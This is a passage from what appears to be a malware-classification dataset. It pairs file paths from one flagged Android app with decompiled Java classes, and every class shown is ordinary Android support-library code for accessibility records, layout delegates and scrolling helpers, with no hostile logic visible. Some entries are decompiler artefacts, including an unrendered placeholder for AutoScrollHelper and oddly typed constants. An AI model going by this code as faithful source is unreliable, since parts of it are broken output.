IMPL.getFromIndex(this.mRecord);   }   public void setFromIndex(  int fromIndex){     IMPL.setFromIndex(this.mRecord,fromIndex);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public void setToIndex(  int toIndex){     IMPL.setToIndex(this.mRecord,toIndex);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public void setScrollX(  int scrollX){     IMPL.setScrollX(this.mRecord,scrollX);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public void setScrollY(  int scrollY){     IMPL.setScrollY(this.mRecord,scrollY);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public void setMaxScrollX(  int maxScrollX){     IMPL.setMaxScrollX(this.mRecord,maxScrollX);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public void setMaxScrollY(  int maxScrollY){     IMPL.setMaxScrollY(this.mRecord,maxScrollY);   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public void setAddedCount(  int addedCount){     IMPL.setAddedCount(this.mRecord,addedCount);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public void setRemovedCount(  int removedCount){     IMPL.setRemovedCount(this.mRecord,removedCount);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mRecord,className);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public void setBeforeText(  CharSequence beforeText){     IMPL.setBeforeText(this.mRecord,beforeText);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mRecord,contentDescription);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public void setParcelableData(  Parcelable parcelableData){     IMPL.setParcelableData(this.mRecord,parcelableData);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat other=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? other.mRecord == null : this.mRecord.equals(other.mRecord);     }     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object record){     return AccessibilityRecord.obtain((AccessibilityRecord)record);   }   public static int getAddedCount(  Object record){     return ((AccessibilityRecord)record).getAddedCount();   }   public static CharSequence getBeforeText(  Object record){     return ((AccessibilityRecord)record).getBeforeText();   }   public static CharSequence getClassName(  Object record){     return ((AccessibilityRecord)record).getClassName();   }   public static CharSequence getContentDescription(  Object record){     return ((AccessibilityRecord)record).getContentDescription();   }   public static int getCurrentItemIndex(  Object record){     return ((AccessibilityRecord)record).getCurrentItemIndex();   }   public static int getFromIndex(  Object record){     return ((AccessibilityRecord)record).getFromIndex();   }   public static int getItemCount(  Object record){     return ((AccessibilityRecord)record).getItemCount();   }   public static Parcelable getParcelableData(  Object record){     return ((AccessibilityRecord)record).getParcelableData();   }   public static int getRemovedCount(  Object record){     return ((AccessibilityRecord)record).getRemovedCount();   }   public static int getScrollX(  Object record){     return ((AccessibilityRecord)record).getScrollX();   }   public static int getScrollY(  Object record){     return ((AccessibilityRecord)record).getScrollY();   }   public static Object getSource(  Object record){     return ((AccessibilityRecord)record).getSource();   }   public static List<CharSequence> getText(  Object record){     return ((AccessibilityRecord)record).getText();   }   public static int getToIndex(  Object record){     return ((AccessibilityRecord)record).getToIndex();   }   public static int getWindowId(  Object record){     return ((AccessibilityRecord)record).getWindowId();   }   public static boolean isChecked(  Object record){     return ((AccessibilityRecord)record).isChecked();   }   public static boolean isEnabled(  Object record){     return ((AccessibilityRecord)record).isEnabled();   }   public static boolean isFullScreen(  Object record){     return ((AccessibilityRecord)record).isFullScreen();   }   public static boolean isPassword(  Object record){     return ((AccessibilityRecord)record).isPassword();   }   public static boolean isScrollable(  Object record){     return ((AccessibilityRecord)record).isScrollable();   }   public static void recycle(  Object record){     ((AccessibilityRecord)record).recycle();   }   public static void setAddedCount(  Object record,  int addedCount){     ((AccessibilityRecord)record).setAddedCount(addedCount);   }   public static void setBeforeText(  Object record,  CharSequence beforeText){     ((AccessibilityRecord)record).setBeforeText(beforeText);   }   public static void setChecked(  Object record,  boolean isChecked){     ((AccessibilityRecord)record).setChecked(isChecked);   }   public static void setClassName(  Object record,  CharSequence className){     ((AccessibilityRecord)record).setClassName(className);   }   public static void setContentDescription(  Object record,  CharSequence contentDescription){     ((AccessibilityRecord)record).setContentDescription(contentDescription);   }   public static void setCurrentItemIndex(  Object record,  int currentItemIndex){     ((AccessibilityRecord)record).setCurrentItemIndex(currentItemIndex);   }   public static void setEnabled(  Object record,  boolean isEnabled){     ((AccessibilityRecord)record).setEnabled(isEnabled);   }   public static void setFromIndex(  Object record,  int fromIndex){     ((AccessibilityRecord)record).setFromIndex(fromIndex);   }   public static void setFullScreen(  Object record,  boolean isFullScreen){     ((AccessibilityRecord)record).setFullScreen(isFullScreen);   }   public static void setItemCount(  Object record,  int itemCount){     ((AccessibilityRecord)record).setItemCount(itemCount);   }   public static void setParcelableData(  Object record,  Parcelable parcelableData){     ((AccessibilityRecord)record).setParcelableData(parcelableData);   }   public static void setPassword(  Object record,  boolean isPassword){     ((AccessibilityRecord)record).setPassword(isPassword);   }   public static void setRemovedCount(  Object record,  int removedCount){     ((AccessibilityRecord)record).setRemovedCount(removedCount);   }   public static void setScrollX(  Object record,  int scrollX){     ((AccessibilityRecord)record).setScrollX(scrollX);   }   public static void setScrollY(  Object record,  int scrollY){     ((AccessibilityRecord)record).setScrollY(scrollY);   }   public static void setScrollable(  Object record,  boolean scrollable){     ((AccessibilityRecord)record).setScrollable(scrollable);   }   public static void setSource(  Object record,  View source){     ((AccessibilityRecord)record).setSource(source);   }   public static void setToIndex(  Object record,  int toIndex){     ((AccessibilityRecord)record).setToIndex(toIndex);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object record){     return ((AccessibilityRecord)record).getMaxScrollX();   }   public static int getMaxScrollY(  Object record){     return ((AccessibilityRecord)record).getMaxScrollY();   }   public static void setMaxScrollX(  Object record,  int maxScrollX){     ((AccessibilityRecord)record).setMaxScrollX(maxScrollX);   }   public static void setMaxScrollY(  Object record,  int maxScrollY){     ((AccessibilityRecord)record).setMaxScrollY(maxScrollY);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object record,  View root,  int virtualDescendantId){     ((AccessibilityRecord)record).setSource(root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordIcsImpl.code","static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object record){     return AccessibilityRecordCompatIcs.obtain(record);   }   @Override public int getAddedCount(  Object record){     return AccessibilityRecordCompatIcs.getAddedCount(record);   }   @Override public CharSequence getBeforeText(  Object record){     return AccessibilityRecordCompatIcs.getBeforeText(record);   }   @Override public CharSequence getClassName(  Object record){     return AccessibilityRecordCompatIcs.getClassName(record);   }   @Override public CharSequence getContentDescription(  Object record){     return AccessibilityRecordCompatIcs.getContentDescription(record);   }   @Override public int getCurrentItemIndex(  Object record){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);   }   @Override public int getFromIndex(  Object record){     return AccessibilityRecordCompatIcs.getFromIndex(record);   }   @Override public int getItemCount(  Object record){     return AccessibilityRecordCompatIcs.getItemCount(record);   }   @Override public Parcelable getParcelableData(  Object record){     return AccessibilityRecordCompatIcs.getParcelableData(record);   }   @Override public int getRemovedCount(  Object record){     return AccessibilityRecordCompatIcs.getRemovedCount(record);   }   @Override public int getScrollX(  Object record){     return AccessibilityRecordCompatIcs.getScrollX(record);   }   @Override public int getScrollY(  Object record){     return AccessibilityRecordCompatIcs.getScrollY(record);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));   }   @Override public List<CharSequence> getText(  Object record){     return AccessibilityRecordCompatIcs.getText(record);   }   @Override public int getToIndex(  Object record){     return AccessibilityRecordCompatIcs.getToIndex(record);   }   @Override public int getWindowId(  Object record){     return AccessibilityRecordCompatIcs.getWindowId(record);   }   @Override public boolean isChecked(  Object record){     return AccessibilityRecordCompatIcs.isChecked(record);   }   @Override public boolean isEnabled(  Object record){     return AccessibilityRecordCompatIcs.isEnabled(record);   }   @Override public boolean isFullScreen(  Object record){     return AccessibilityRecordCompatIcs.isFullScreen(record);   }   @Override public boolean isPassword(  Object record){     return AccessibilityRecordCompatIcs.isPassword(record);   }   @Override public boolean isScrollable(  Object record){     return AccessibilityRecordCompatIcs.isScrollable(record);   }   @Override public void recycle(  Object record){     AccessibilityRecordCompatIcs.recycle(record);   }   @Override public void setAddedCount(  Object record,  int addedCount){     AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){     AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);   }   @Override public void setChecked(  Object record,  boolean isChecked){     AccessibilityRecordCompatIcs.setChecked(record,isChecked);   }   @Override public void setClassName(  Object record,  CharSequence className){     AccessibilityRecordCompatIcs.setClassName(record,className);   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){     AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){     AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);   }   @Override public void setEnabled(  Object record,  boolean isEnabled){     AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);   }   @Override public void setFromIndex(  Object record,  int fromIndex){     AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){     AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);   }   @Override public void setItemCount(  Object record,  int itemCount){     AccessibilityRecordCompatIcs.setItemCount(record,itemCount);   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){     AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);   }   @Override public void setPassword(  Object record,  boolean isPassword){     AccessibilityRecordCompatIcs.setPassword(record,isPassword);   }   @Override public void setRemovedCount(  Object record,  int removedCount){     AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);   }   @Override public void setScrollX(  Object record,  int scrollX){     AccessibilityRecordCompatIcs.setScrollX(record,scrollX);   }   @Override public void setScrollY(  Object record,  int scrollY){     AccessibilityRecordCompatIcs.setScrollY(record,scrollY);   }   @Override public void setScrollable(  Object record,  boolean scrollable){     AccessibilityRecordCompatIcs.setScrollable(record,scrollable);   }   @Override public void setSource(  Object record,  View source){     AccessibilityRecordCompatIcs.setSource(record,source);   }   @Override public void setToIndex(  Object record,  int toIndex){     AccessibilityRecordCompatIcs.setToIndex(record,toIndex);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordIcsMr1Impl.code","static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);   }   @Override public int getMaxScrollY(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordJellyBeanImpl.code","static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){     AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityRecordStubImpl.code","static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object record){     return null;   }   @Override public int getAddedCount(  Object record){     return 0;   }   @Override public CharSequence getBeforeText(  Object record){     return null;   }   @Override public CharSequence getClassName(  Object record){     return null;   }   @Override public CharSequence getContentDescription(  Object record){     return null;   }   @Override public int getCurrentItemIndex(  Object record){     return 0;   }   @Override public int getFromIndex(  Object record){     return 0;   }   @Override public int getItemCount(  Object record){     return 0;   }   @Override public int getMaxScrollX(  Object record){     return 0;   }   @Override public int getMaxScrollY(  Object record){     return 0;   }   @Override public Parcelable getParcelableData(  Object record){     return null;   }   @Override public int getRemovedCount(  Object record){     return 0;   }   @Override public int getScrollX(  Object record){     return 0;   }   @Override public int getScrollY(  Object record){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return null;   }   @Override public List<CharSequence> getText(  Object record){     return Collections.emptyList();   }   @Override public int getToIndex(  Object record){     return 0;   }   @Override public int getWindowId(  Object record){     return 0;   }   @Override public boolean isChecked(  Object record){     return false;   }   @Override public boolean isEnabled(  Object record){     return false;   }   @Override public boolean isFullScreen(  Object record){     return false;   }   @Override public boolean isPassword(  Object record){     return false;   }   @Override public boolean isScrollable(  Object record){     return false;   }   @Override public void recycle(  Object record){   }   @Override public void setAddedCount(  Object record,  int addedCount){   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){   }   @Override public void setChecked(  Object record,  boolean isChecked){   }   @Override public void setClassName(  Object record,  CharSequence className){   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){   }   @Override public void setEnabled(  Object record,  boolean isEnabled){   }   @Override public void setFromIndex(  Object record,  int fromIndex){   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){   }   @Override public void setItemCount(  Object record,  int itemCount){   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){   }   @Override public void setPassword(  Object record,  boolean isPassword){   }   @Override public void setRemovedCount(  Object record,  int removedCount){   }   @Override public void setScrollX(  Object record,  int scrollX){   }   @Override public void setScrollY(  Object record,  int scrollY){   }   @Override public void setScrollable(  Object record,  boolean scrollable){   }   @Override public void setSource(  Object record,  View source){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){   }   @Override public void setToIndex(  Object record,  int toIndex){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityStateChangeListenerBridge.code","interface AccessibilityStateChangeListenerBridge {   void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityStateChangeListenerCompat.code","public static abstract class AccessibilityStateChangeListenerCompat {   final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);   public abstract void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\AccessibilityDelegate.code","class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     addChildrenForAccessibility(info,(ViewGroup)host);   }   private void addChildrenForAccessibility(  AccessibilityNodeInfoCompat info,  ViewGroup v){     int childCount=v.getChildCount();     for (int i=0; i < childCount; i++) {       View child=v.getChildAt(i);       if (!filter(child)) {         int importance=ViewCompat.getImportantForAccessibility(child); switch (importance) { case 0:           ViewCompat.setImportantForAccessibility(child,1);         break; case 2:       if (child instanceof ViewGroup) {         addChildrenForAccessibility(info,(ViewGroup)child);         break;       }  else {         continue;       }   }   info.addChild(child); } } } @Override public boolean onRequestSendAccessibilityEvent(ViewGroup host,View child,AccessibilityEvent event){ return !filter(child) ? super.onRequestSendAccessibilityEvent(host,child,event) : DrawerLayout.ALLOW_EDGE_LOCK; } public boolean filter(View child){ View openDrawer=DrawerLayout.this.findOpenDrawer(); return (openDrawer == null || openDrawer == child) ? DrawerLayout.ALLOW_EDGE_LOCK : DrawerLayout.CHILDREN_DISALLOW_INTERCEPT; } private void copyNodeInfoNoChildren(AccessibilityNodeInfoCompat dest,AccessibilityNodeInfoCompat src){ Rect rect=this.mTmpRect; src.getBoundsInParent(rect); dest.setBoundsInParent(rect); src.getBoundsInScreen(rect); dest.setBoundsInScreen(rect); dest.setVisibleToUser(src.isVisibleToUser()); dest.setPackageName(src.getPackageName()); dest.setClassName(src.getClassName()); dest.setContentDescription(src.getContentDescription()); dest.setEnabled(src.isEnabled()); dest.setClickable(src.isClickable()); dest.setFocusable(src.isFocusable()); dest.setFocused(src.isFocused()); dest.setAccessibilityFocused(src.isAccessibilityFocused()); dest.setSelected(src.isSelected()); dest.setLongClickable(src.isLongClickable()); dest.addAction(src.getActions()); } } class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     info.setClassName(SlidingPaneLayout.class.getName());     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     int childCount=SlidingPaneLayout.this.getChildCount();     for (int i=0; i < childCount; i++) {       View child=SlidingPaneLayout.this.getChildAt(i);       if (!filter(child) && child.getVisibility() == 0) {         ViewCompat.setImportantForAccessibility(child,1);         info.addChild(child);       }     }   }   @Override public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     super.onInitializeAccessibilityEvent(host,event);     event.setClassName(SlidingPaneLayout.class.getName());   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     if (filter(child)) {       return false;     }     return super.onRequestSendAccessibilityEvent(host,child,event);   }   public boolean filter(  View child){     return SlidingPaneLayout.this.isDimmed(child);   }   private void copyNodeInfoNoChildren(  AccessibilityNodeInfoCompat dest,  AccessibilityNodeInfoCompat src){     Rect rect=this.mTmpRect;     src.getBoundsInParent(rect);     dest.setBoundsInParent(rect);     src.getBoundsInScreen(rect);     dest.setBoundsInScreen(rect);     dest.setVisibleToUser(src.isVisibleToUser());     dest.setPackageName(src.getPackageName());     dest.setClassName(src.getClassName());     dest.setContentDescription(src.getContentDescription());     dest.setEnabled(src.isEnabled());     dest.setClickable(src.isClickable());     dest.setFocusable(src.isFocusable());     dest.setFocused(src.isFocused());     dest.setAccessibilityFocused(src.isAccessibilityFocused());     dest.setSelected(src.isSelected());     dest.setLongClickable(src.isLongClickable());     dest.addAction(src.getActions());     dest.setMovementGranularities(src.getMovementGranularities());   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\AutoScrollHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@397cb9da"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\BaseEdgeEffectImpl.code","static class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){   }   @Override public boolean isFinished(  Object edgeEffect){     return true;   }   @Override public void finish(  Object edgeEffect){   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return false;   }   @Override public boolean onRelease(  Object edgeEffect){     return false;   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return false;   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\BaseListPopupWindowImpl.code","static class BaseListPopupWindowImpl implements ListPopupWindowImpl {   BaseListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\BasePopupMenuImpl.code","static class BasePopupMenuImpl implements PopupMenuImpl {   BasePopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\Callback.code","public static abstract class Callback {   public abstract boolean tryCaptureView(  View view,  int i);   public void onViewDragStateChanged(  int state){   }   public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){   }   public void onViewCaptured(  View capturedChild,  int activePointerId){   }   public void onViewReleased(  View releasedChild,  float xvel,  float yvel){   }   public void onEdgeTouched(  int edgeFlags,  int pointerId){   }   public boolean onEdgeLock(  int edgeFlags){     return false;   }   public void onEdgeDragStarted(  int edgeFlags,  int pointerId){   }   public int getOrderedChildIndex(  int index){     return index;   }   public int getViewHorizontalDragRange(  View child){     return 0;   }   public int getViewVerticalDragRange(  View child){     return 0;   }   public int clampViewPositionHorizontal(  View child,  int left,  int dx){     return 0;   }   public int clampViewPositionVertical(  View child,  int top,  int dy){     return 0;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ChangeObserver.code","public class ChangeObserver extends ContentObserver {   public ChangeObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     CursorAdapter.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ClampedScroller.code","public static class ClampedScroller {   private int mEffectiveRampDown;   private int mRampDownDuration;   private int mRampUpDuration;   private float mStopValue;   private float mTargetVelocityX;   private float mTargetVelocityY;   private long mStartTime=Long.MIN_VALUE;   private long mStopTime=-1;   private long mDeltaTime=0;   private int mDeltaX=0;   private int mDeltaY=0;   public void setRampUpDuration(  int durationMillis){     this.mRampUpDuration=durationMillis;   }   public void setRampDownDuration(  int durationMillis){     this.mRampDownDuration=durationMillis;   }   public void start(){     this.mStartTime=AnimationUtils.currentAnimationTimeMillis();     this.mStopTime=-1L;     this.mDeltaTime=this.mStartTime;     this.mStopValue=0.5f;     this.mDeltaX=0;     this.mDeltaY=0;   }   public void requestStop(){     long currentTime=AnimationUtils.currentAnimationTimeMillis();     this.mEffectiveRampDown=AutoScrollHelper.constrain((int)(currentTime - this.mStartTime),0,this.mRampDownDuration);     this.mStopValue=getValueAt(currentTime);     this.mStopTime=currentTime;   }   public boolean isFinished(){     return this.mStopTime > 0 && AnimationUtils.currentAnimationTimeMillis() > this.mStopTime + ((long)this.mEffectiveRampDown);   }   private float getValueAt(  long currentTime){     if (currentTime < this.mStartTime) {       return 0.0f;     }     if (this.mStopTime < 0 || currentTime < this.mStopTime) {       long elapsedSinceStart=currentTime - this.mStartTime;       return AutoScrollHelper.constrain(((float)elapsedSinceStart) / this.mRampUpDuration,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * 0.5f;     }     long elapsedSinceEnd=currentTime - this.mStopTime;     return (AutoScrollHelper.constrain(((float)elapsedSinceEnd) / this.mEffectiveRampDown,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * this.mStopValue) + (AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY - this.mStopValue);   }   private float interpolateValue(  float value){     return ((-4.0f) * value * value) + (4.0f * value);   }   public void computeScrollDelta(){     if (this.mDeltaTime == 0) {       throw new RuntimeException(""Cannot compute scroll delta before calling start()"");     }     long currentTime=AnimationUtils.currentAnimationTimeMillis();     float value=getValueAt(currentTime);     float scale=interpolateValue(value);     long elapsedSinceDelta=currentTime - this.mDeltaTime;     this.mDeltaTime=currentTime;     this.mDeltaX=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityX);     this.mDeltaY=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityY);   }   public void setTargetVelocity(  float x,  float y){     this.mTargetVelocityX=x;     this.mTargetVelocityY=y;   }   public int getHorizontalDirection(){     return (int)(this.mTargetVelocityX / Math.abs(this.mTargetVelocityX));   }   public int getVerticalDirection(){     return (int)(this.mTargetVelocityY / Math.abs(this.mTargetVelocityY));   }   public int getDeltaX(){     return this.mDeltaX;   }   public int getDeltaY(){     return this.mDeltaY;   } } "
